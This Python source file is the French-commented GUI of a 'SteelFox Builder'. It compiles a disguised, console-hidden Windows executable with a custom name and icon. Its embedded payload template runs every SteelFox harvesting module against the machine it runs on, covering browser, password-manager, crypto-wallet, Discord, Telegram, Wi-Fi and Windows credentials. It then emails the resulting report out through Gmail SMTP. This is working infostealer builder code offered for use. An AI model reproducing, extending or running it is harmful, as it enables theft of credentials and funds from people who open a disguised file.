#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SteelFox Builder — Hack Constructor
Génère un exécutable furtif personnalisé (icône, nom) qui lance SteelFox
en mode silencieux et envoie le rapport HTML par e-mail.
"""

from __future__ import annotations

import base64
import os
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import webbrowser
from pathlib import Path
from tkinter import filedialog, messagebox, ttk
import tkinter as tk
from PIL import Image, ImageTk

# ─── Constantes ──────────────────────────────────────────────────────────
ROOT_DIR   = Path(__file__).resolve().parent
ASSETS_DIR = ROOT_DIR / "steelfox" / "assets"

BG        = "#0f0f0f"
BG2       = "#1a1a1a"
BG3       = "#242424"
BORDER    = "#2e2e2e"
ACCENT    = "#e05c00"
ACCENT_HV = "#ff7722"
FG        = "#e8e8e8"
FG_DIM    = "#888888"
FG_LINK   = "#4da6ff"
FONT      = ("Segoe UI", 10)
FONT_BOLD = ("Segoe UI", 10, "bold")
FONT_LG   = ("Segoe UI", 13, "bold")
FONT_SM   = ("Segoe UI", 9)

_EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")


# ─── Template du script généré ────────────────────────────────────────────
# Le payload est un script Python autonome intégré dans l'exécutable produit.
# Il importe directement le package steelfox (copié dans le bundle par PyInstaller)
# et envoie le rapport HTML par e-mail sans jamais afficher de fenêtre console.

_PAYLOAD_TEMPLATE = """#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SteelFox - payload furtif genere automatiquement.

import base64
import os
import smtplib
import sys
import tempfile
import time
import shutil
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


# ─── Furtivité : masquer la fenêtre console ────────────────────────────
def _hide_console() -> None:
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


# ─── Setup du chemin si build PyInstaller ─────────────────────────────
if getattr(sys, "frozen", False):
    _BASE = sys._MEIPASS
    sys.path.insert(0, _BASE)
else:
    _BASE = os.path.dirname(os.path.abspath(__file__))
    sys.path.insert(0, _BASE)


# ─── Envoi du rapport par e-mail ──────────────────────────────────────
def _send_report(sender_email: str, password: str, receiver_email: str, report_path: str) -> bool:
    msg = MIMEMultipart()
    msg["From"]    = sender_email
    msg["To"]      = receiver_email
    msg["Subject"] = "SteelFox — Rapport de securite"

    msg.attach(MIMEText(
        "Rapport de reconnaissance joint en piece jointe.\\n"
        "-- SteelFox Framework",
        "plain",
    ))

    with open(report_path, "rb") as fh:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(fh.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            'attachment; filename="{}"'.format(os.path.basename(report_path)),
        )
        msg.attach(part)

    # Robustesse : 3 tentatives d'envoi en cas de mauvaise connexion
    for attempt in range(3):
        try:
            with smtplib.SMTP("smtp.gmail.com", 587, timeout=30) as srv:
                srv.ehlo()
                srv.starttls()
                srv.login(sender_email, password)
                srv.sendmail(sender_email, receiver_email, msg.as_string())
            return True
        except Exception:
            if attempt < 2:
                time.sleep(10)  # Attendre 10s avant de réessayer
    return False


# ─── Point d'entrée ───────────────────────────────────────────────────
def main() -> None:
    _hide_console()

    _receiver = "{RECEIVER}"
    _sender   = "{SENDER}"
    _password = base64.b64decode("{ENC_PASS}").decode()

    with tempfile.TemporaryDirectory() as tmp:
        # Importer SteelFox directement — pas de sous-processus
        from steelfox.core.config import config
        from steelfox.core.runner import run_steelfox
        from steelfox.core.output import StandardOutput

        config.quiet_mode   = True
        config.stealth_mode = True
        config.st           = StandardOutput()

        for _ in run_steelfox(
            category="all",
            output_dir=tmp,
            output_format="html",
        ):
            pass

        # Retrouver et envoyer le rapport HTML produit
        for fname in os.listdir(tmp):
            if fname.endswith(".html"):
                report_path = os.path.join(tmp, fname)
                
                # Sauvegarde locale pour vérification (dans le dossier TEMP de l'utilisateur)
                local_copy = os.path.join(os.environ.get("TEMP", os.path.expanduser("~")), "steelfox_last_report.html")
                try:
                    shutil.copy2(report_path, local_copy)
                except Exception:
                    pass

                _send_report(_sender, _password, _receiver, report_path)
                break


if __name__ == "__main__":
    main()
"""

# ─── Widget helpers ───────────────────────────────────────────────────────

def _set_dark_titlebar(window: tk.Tk) -> None:
    """Force la barre de titre en mode sombre sur Windows 10/11."""
    try:
        window.update()
        import ctypes
        DWMWA_USE_IMMERSIVE_DARK_MODE = 20
        set_window_attribute = ctypes.windll.dwmapi.DwmSetWindowAttribute
        get_parent = ctypes.windll.user32.GetParent
        hwnd = get_parent(window.winfo_id())
        rendering_policy = ctypes.c_int(2)
        set_window_attribute(hwnd, DWMWA_USE_IMMERSIVE_DARK_MODE,
                             ctypes.byref(rendering_policy),
                             ctypes.sizeof(rendering_policy))
    except Exception:
        pass


def _label(parent: tk.Widget, text: str, **kw) -> tk.Label:
    return tk.Label(parent, text=text,
                    bg=kw.pop("bg", BG2), fg=kw.pop("fg", FG),
                    font=kw.pop("font", FONT), **kw)


def _entry(parent: tk.Widget, **kw) -> tk.Entry:
    return tk.Entry(parent, bg=BG3, fg=FG, insertbackground=FG,
                    relief="flat", highlightthickness=1,
                    highlightbackground=BORDER, highlightcolor=ACCENT,
                    disabledbackground=BG2, disabledforeground=FG_DIM,
                    font=FONT, **kw)


def _btn(parent: tk.Widget, text: str, cmd, accent: bool = False, **kw) -> tk.Button:
    bg = ACCENT if accent else BG3
    return tk.Button(
        parent, text=text, command=cmd,
        bg=bg, fg=FG, activebackground=ACCENT_HV, activeforeground=FG,
        relief="flat", padx=12, pady=6, cursor="hand2",
        font=FONT_BOLD if accent else FONT, **kw,
    )


def _separator(parent: tk.Widget) -> tk.Frame:
    return tk.Frame(parent, bg=BORDER, height=1)


# ─── Application principale ───────────────────────────────────────────────

class BuilderApp:
    """Interface graphique du constructeur de payload SteelFox."""

    def __init__(self, root: tk.Tk) -> None:
        self.root = root
        self._custom_icon_path: str | None = None
        self._logo_img = None
        self._preview_img = None

        self._setup_window()
        self._build_ui()

    # ── Configuration de la fenêtre ──────────────────────────────────────
    def _setup_window(self) -> None:
        self.root.title("SteelFox Builder")
        self.root.geometry("550x780")
        self.root.resizable(False, False)
        self.root.configure(bg=BG)
        
        _set_dark_titlebar(self.root)

        icon = ASSETS_DIR / "logo-steel-fox-icon.ico"
        if icon.exists():
            try:
                self.root.iconbitmap(str(icon))
            except Exception:
                pass

        # Style ttk uniquement pour le Combobox
        style = ttk.Style()
        style.theme_use("default")
        style.configure(
            "Dark.TCombobox",
            fieldbackground=BG3, background=BG3,
            foreground=FG, selectbackground=ACCENT,
            selectforeground=FG, arrowcolor=FG_DIM,
            borderwidth=0, relief="flat",
        )
        style.map("Dark.TCombobox", fieldbackground=[("readonly", BG3)])

    # ── Construction de l'interface ──────────────────────────────────────
    def _build_ui(self) -> None:
        root = self.root

        # — En-tête —
        header = tk.Frame(root, bg=BG, pady=18)
        header.pack(fill="x", padx=24)
        
        # Logo
        logo_path = ASSETS_DIR / "logo-steel-fox-white-1.png"
        if logo_path.exists():
            try:
                img = Image.open(logo_path)
                img.thumbnail((250, 80), Image.LANCZOS)
                self._logo_img = ImageTk.PhotoImage(img)
                tk.Label(header, image=self._logo_img, bg=BG).pack(pady=(0, 10))
            except Exception:
                pass
        
        tk.Label(header, text="Constructeur de payload furtif",
                 font=FONT_SM, bg=BG, fg=FG_DIM).pack()

        _separator(root).pack(fill="x")

        # — Corps —
        body = tk.Frame(root, bg=BG2, pady=10)
        body.pack(fill="both", expand=True)

        def section(title: str) -> tk.Frame:
            tk.Label(body, text=title.upper(),
                     font=("Segoe UI", 8, "bold"), bg=BG2, fg=FG_DIM,
                     ).pack(anchor="w", padx=28, pady=(12, 2))
            frm = tk.Frame(body, bg=BG2)
            frm.pack(fill="x", padx=28)
            return frm

        # ── Nom du fichier ──
        f = section("Nom du fichier executable")
        self._name_var = tk.StringVar(value="rapport_document")
        _entry(f, textvariable=self._name_var, width=46).pack(fill="x")

        # ── Icône ──
        f = section("Icone")
        icon_row = tk.Frame(f, bg=BG2)
        icon_row.pack(fill="x")

        icons = self._list_icons()
        self._icon_var = tk.StringVar(value=icons[0] if icons else "")
        self._icon_combo = ttk.Combobox(
            icon_row, textvariable=self._icon_var, values=icons,
            state="readonly", style="Dark.TCombobox", width=28,
        )
        self._icon_combo.pack(side="left")
        self._icon_combo.bind("<<ComboboxSelected>>", self._update_icon_preview)
        
        _btn(icon_row, "Image personnalisee ...", self._pick_icon).pack(side="right")
        
        self._icon_preview_lbl = tk.Label(icon_row, bg=BG2)
        self._icon_preview_lbl.pack(side="left", padx=(15, 0))
        self._update_icon_preview()

        # ── E-mail Destinataire ──
        f = section("Adresse e-mail de reception (destinataire)")
        self._receiver_var = tk.StringVar()
        _entry(f, textvariable=self._receiver_var, width=46).pack(fill="x")

        # ── E-mail Expéditeur ──
        f = section("Adresse e-mail d'envoi (expediteur)")
        
        self._same_email_var = tk.BooleanVar(value=True)
        chk = tk.Checkbutton(f, text="Utiliser la meme adresse pour l'envoi", 
                             variable=self._same_email_var, command=self._toggle_sender,
                             bg=BG2, fg=FG_DIM, selectcolor=BG3, activebackground=BG2, activeforeground=FG)
        chk.pack(anchor="w", pady=(0, 5))
        
        self._sender_var = tk.StringVar()
        self._sender_entry = _entry(f, textvariable=self._sender_var, width=46)
        self._sender_entry.pack(fill="x")
        self._toggle_sender()

        # ── Mot de passe d'application ──
        f = section("Mot de passe d'application Google (expediteur)")
        self._pass_var = tk.StringVar()
        _entry(f, textvariable=self._pass_var, show="*", width=46).pack(fill="x")
        lnk = tk.Label(
            f, text="Comment obtenir un mot de passe d'application ?",
            font=FONT_SM, bg=BG2, fg=FG_LINK, cursor="hand2",
        )
        lnk.pack(anchor="w", pady=(4, 0))
        lnk.bind("<Button-1>", lambda _: webbrowser.open(
            "https://support.google.com/accounts/answer/185833"))

        # ── Dossier de sortie ──
        f = section("Dossier de sortie de l'executable")
        out_row = tk.Frame(f, bg=BG2)
        out_row.pack(fill="x")
        self._outdir_var = tk.StringVar(value=str(ROOT_DIR))
        _entry(out_row, textvariable=self._outdir_var, width=36).pack(side="left")
        _btn(out_row, "...", self._pick_outdir).pack(side="left", padx=(6, 0))

        # — Pied de page —
        _separator(root).pack(fill="x")
        foot = tk.Frame(root, bg=BG, pady=16)
        foot.pack(fill="x", padx=24)

        self._build_btn = _btn(
            foot, "Construire l'executable", self._start_build, accent=True,
        )
        self._build_btn.pack(fill="x")

        self._status_var = tk.StringVar(value="")
        self._status_lbl = tk.Label(
            foot, textvariable=self._status_var,
            bg=BG, fg=FG_DIM, font=FONT_SM, wraplength=470,
        )
        self._status_lbl.pack(pady=(8, 0))

    # ── Logique UI ───────────────────────────────────────────────────────
    def _toggle_sender(self):
        if self._same_email_var.get():
            self._sender_entry.config(state="disabled")
        else:
            self._sender_entry.config(state="normal")

    def _list_icons(self) -> list[str]:
        if not ASSETS_DIR.exists():
            return ["(aucun)"]
        icons = sorted(p.stem for p in ASSETS_DIR.glob("*.ico"))
        return icons if icons else ["(aucun)"]

    def _pick_icon(self) -> None:
        path = filedialog.askopenfilename(
            title="Choisir une icone ou une image",
            filetypes=[
                ("Images / Icones", "*.ico *.png *.jpg *.jpeg *.bmp"),
                ("Tous les fichiers", "*.*"),
            ],
        )
        if path:
            self._custom_icon_path = path
            self._icon_var.set(Path(path).name[:30])
            self._update_icon_preview()

    def _update_icon_preview(self, *args):
        path = self._resolve_icon_path_for_preview()
        if path and os.path.exists(path):
            try:
                img = Image.open(path)
                img.thumbnail((32, 32), Image.LANCZOS)
                self._preview_img = ImageTk.PhotoImage(img)
                self._icon_preview_lbl.config(image=self._preview_img)
            except Exception:
                self._icon_preview_lbl.config(image="")
        else:
            self._icon_preview_lbl.config(image="")

    def _resolve_icon_path_for_preview(self) -> str:
        if self._custom_icon_path:
            return self._custom_icon_path
        stem = self._icon_var.get().strip()
        if stem and stem != "(aucun)":
            ico = ASSETS_DIR / f"{stem}.ico"
            if ico.exists():
                return str(ico)
        return ""

    def _pick_outdir(self) -> None:
        d = filedialog.askdirectory(
            title="Choisir le dossier de sortie",
            initialdir=self._outdir_var.get(),
        )
        if d:
            self._outdir_var.set(d)

    # ── Validation des champs ─────────────────────────────────────────────
    def _validate(self) -> bool:
        name     = self._name_var.get().strip()
        receiver = self._receiver_var.get().strip()
        sender   = receiver if self._same_email_var.get() else self._sender_var.get().strip()
        pwd      = self._pass_var.get().strip()
        out      = self._outdir_var.get().strip()

        if not name:
            messagebox.showerror("Champ manquant", "Veuillez saisir un nom de fichier.")
            return False
        if not _EMAIL_RE.match(receiver):
            messagebox.showerror("E-mail invalide", "L'adresse e-mail de reception n'est pas valide.")
            return False
        if not _EMAIL_RE.match(sender):
            messagebox.showerror("E-mail invalide", "L'adresse e-mail d'envoi n'est pas valide.")
            return False
        if not pwd:
            messagebox.showerror("Champ manquant", "Veuillez saisir le mot de passe d'application Google.")
            return False
        if not os.path.isdir(out):
            messagebox.showerror("Dossier invalide", f"Le dossier de sortie est introuvable :\n{out}")
            return False
            
        # Vérifier si le fichier existe déjà
        dest_file = Path(out) / f"{name}.exe"
        if dest_file.exists():
            if not messagebox.askyesno("Fichier existant", f"Le fichier {name}.exe existe deja dans le dossier de sortie.\nVoulez-vous l'ecraser ?"):
                return False
                
        return True

    # ── Lancement de la construction (dans un thread) ────────────────────
    def _start_build(self) -> None:
        if not self._validate():
            return
        self._build_btn.config(state="disabled")
        self._set_status("Construction en cours...", FG_DIM)
        threading.Thread(target=self._build_worker, daemon=True).start()

    def _build_worker(self) -> None:
        """Tourne dans un thread secondaire pour ne pas geler l'interface."""
        name     = self._name_var.get().strip()
        receiver = self._receiver_var.get().strip()
        sender   = receiver if self._same_email_var.get() else self._sender_var.get().strip()
        pwd      = self._pass_var.get().strip()
        out_dir  = Path(self._outdir_var.get().strip())

        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                tmp = Path(tmpdir)

                self._set_status("Copie des sources SteelFox...", FG_DIM)
                self._copy_steelfox(tmp)

                # Copier le fichier de version pour l'exécutable
                ver_src = ROOT_DIR / "version_payload.txt"
                if ver_src.exists():
                    shutil.copy2(str(ver_src), str(tmp / "version_payload.txt"))

                self._set_status("Generation du payload...", FG_DIM)
                script = tmp / "payload.py"
                script.write_text(self._generate_payload(receiver, sender, pwd), encoding="utf-8")

                self._set_status("Traitement de l'icone...", FG_DIM)
                icon_path = self._resolve_icon(tmp)

                self._set_status("Compilation avec PyInstaller... (peut prendre 1-2 min)", FG_DIM)
                exe = self._pyinstaller_build(tmp, script, name, icon_path)

                dest = out_dir / f"{name}.exe"
                if dest.exists():
                    dest.unlink() # Supprimer l'ancien fichier s'il existe
                shutil.move(str(exe), str(dest))

            self.root.after(0, self._on_build_success, str(dest))

        except Exception as exc:
            self.root.after(0, self._on_build_error, str(exc))

    # ── Étapes de construction ────────────────────────────────────────────

    def _copy_steelfox(self, tmp: Path) -> None:
        """Copie le package steelfox et steelfox.py dans le dossier de build."""
        src_pkg  = ROOT_DIR / "steelfox"
        src_main = ROOT_DIR / "steelfox.py"

        if not src_pkg.exists():
            raise FileNotFoundError(f"Package SteelFox introuvable : {src_pkg}")
        if not src_main.exists():
            raise FileNotFoundError(f"steelfox.py introuvable : {src_main}")

        shutil.copytree(str(src_pkg), str(tmp / "steelfox"),
                        ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
        shutil.copy2(str(src_main), str(tmp / "steelfox.py"))

    def _generate_payload(self, receiver: str, sender: str, password: str) -> str:
        """Remplace les placeholders dans le template."""
        enc = base64.b64encode(password.encode()).decode()
        return _PAYLOAD_TEMPLATE.replace("{RECEIVER}", receiver).replace("{SENDER}", sender).replace("{ENC_PASS}", enc)

    def _resolve_icon(self, tmp: Path) -> str:
        """Retourne le chemin vers un .ico valide dans le dossier tmp."""
        if self._custom_icon_path:
            src = Path(self._custom_icon_path)
            if src.suffix.lower() in (".jpg", ".jpeg", ".png", ".bmp"):
                ico_dst = tmp / (src.stem + ".ico")
                img = Image.open(src).convert("RGBA")
                img.save(
                    str(ico_dst), format="ICO",
                    sizes=[(256, 256), (48, 48), (32, 32), (16, 16)],
                )
                return str(ico_dst)
            dst = tmp / src.name
            shutil.copy2(str(src), str(dst))
            return str(dst)

        stem = self._icon_var.get().strip()
        if stem and stem != "(aucun)":
            ico  = ASSETS_DIR / f"{stem}.ico"
            if ico.exists():
                dst = tmp / ico.name
                shutil.copy2(str(ico), str(dst))
                return str(dst)

        default = ASSETS_DIR / "logo-steel-fox-icon.ico"
        if default.exists():
            dst = tmp / default.name
            shutil.copy2(str(default), str(dst))
            return str(dst)

        return ""

    def _pyinstaller_build(
        self, tmp: Path, script: Path, name: str, icon: str,
    ) -> Path:
        """Lance PyInstaller et retourne le chemin du .exe produit."""
        # Séparateur pour --add-data sous Windows = ';'
        steelfox_data = str(tmp / "steelfox") + os.pathsep + "steelfox"

        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--windowed",                           # aucune console visible
            "--noconfirm",
            "--clean",
            "--name", name,
            "--distpath", str(tmp / "dist"),
            "--workpath", str(tmp / "build"),
            "--specpath", str(tmp),
            "--paths",        str(tmp),             # steelfox/ trouvable à l'import
            "--add-data",     steelfox_data,         # embarquer tout le dossier steelfox/
            # ── Core ──
            "--hidden-import", "steelfox",
            "--hidden-import", "steelfox.core",
            "--hidden-import", "steelfox.core.config",
            "--hidden-import", "steelfox.core.module_base",
            "--hidden-import", "steelfox.core.module_loader",
            "--hidden-import", "steelfox.core.output",
            "--hidden-import", "steelfox.core.privileges",
            "--hidden-import", "steelfox.core.runner",
            "--hidden-import", "steelfox.core.winapi",
            # ── Modules ──
            "--hidden-import", "steelfox.modules",
            "--hidden-import", "steelfox.modules.browsers",
            "--hidden-import", "steelfox.modules.browsers.chromium",
            "--hidden-import", "steelfox.modules.browsers.firefox",
            "--hidden-import", "steelfox.modules.cloud",
            "--hidden-import", "steelfox.modules.cloud.cloud_services",
            "--hidden-import", "steelfox.modules.databases",
            "--hidden-import", "steelfox.modules.databases.db_clients",
            "--hidden-import", "steelfox.modules.devtools",
            "--hidden-import", "steelfox.modules.devtools.dev_credentials",
            "--hidden-import", "steelfox.modules.gaming",
            "--hidden-import", "steelfox.modules.gaming.crypto_wallets",
            "--hidden-import", "steelfox.modules.gaming.multimedia",
            "--hidden-import", "steelfox.modules.gaming.platforms",
            "--hidden-import", "steelfox.modules.mails",
            "--hidden-import", "steelfox.modules.mails.mail_clients",
            "--hidden-import", "steelfox.modules.messaging",
            "--hidden-import", "steelfox.modules.messaging.apps",
            "--hidden-import", "steelfox.modules.messaging.discord",
            "--hidden-import", "steelfox.modules.messaging.telegram",
            "--hidden-import", "steelfox.modules.network",
            "--hidden-import", "steelfox.modules.network.wifi_vpn",
            "--hidden-import", "steelfox.modules.passwords",
            "--hidden-import", "steelfox.modules.passwords.managers",
            "--hidden-import", "steelfox.modules.reconnaissance",
            "--hidden-import", "steelfox.modules.reconnaissance.system_recon",
            "--hidden-import", "steelfox.modules.sysadmin",
            "--hidden-import", "steelfox.modules.sysadmin.remote_tools",
            "--hidden-import", "steelfox.modules.windows",
            "--hidden-import", "steelfox.modules.windows.credentials",
        ]
        if icon:
            cmd += ["--icon", icon]
        # Ajouter les infos de version Windows si disponibles
        ver_file = tmp / "version_payload.txt"
        if ver_file.exists():
            cmd += ["--version-file", str(ver_file)]
        cmd.append(str(script))

        result = subprocess.run(cmd, cwd=str(tmp), capture_output=True, text=True)
        if result.returncode != 0:
            # Écrire le log complet dans un fichier pour diagnostic
            full_log = (result.stdout or "") + "\n" + (result.stderr or "")
            log_file = ROOT_DIR / "build_error.log"
            try:
                log_file.write_text(full_log, encoding="utf-8")
            except Exception:
                pass
            raise RuntimeError(
                f"PyInstaller a echoue (code {result.returncode}).\n"
                f"Log complet sauvegarde dans : {log_file}\n\n"
                + full_log[-2000:]
            )

        exe = tmp / "dist" / f"{name}.exe"
        if not exe.exists():
            raise FileNotFoundError(
                f"Executable attendu introuvable : {exe}\n"
                + result.stdout[-1000:]
            )
        return exe

    # ── Callbacks UI (appelés depuis le thread principal via root.after) ─
    def _set_status(self, text: str, color: str = FG_DIM) -> None:
        self.root.after(0, lambda: (
            self._status_var.set(text),
            self._status_lbl.config(fg=color),
        ))

    def _on_build_success(self, dest: str) -> None:
        self._build_btn.config(state="normal")
        self._status_var.set(f"Executable cree avec succes !")
        self._status_lbl.config(fg="#55dd55")
        messagebox.showinfo("Construction reussie",
                            f"L'executable a ete cree :\n\n{dest}")

    def _on_build_error(self, msg: str) -> None:
        self._build_btn.config(state="normal")
        self._status_var.set("La construction a echoue.")
        self._status_lbl.config(fg="#ff5555")
        messagebox.showerror("Erreur de construction", msg[:900])


# ─── Point d'entrée ───────────────────────────────────────────────────────

def main() -> None:
    root = tk.Tk()
    BuilderApp(root)
    root.mainloop()


if __name__ == "__main__":
    main()
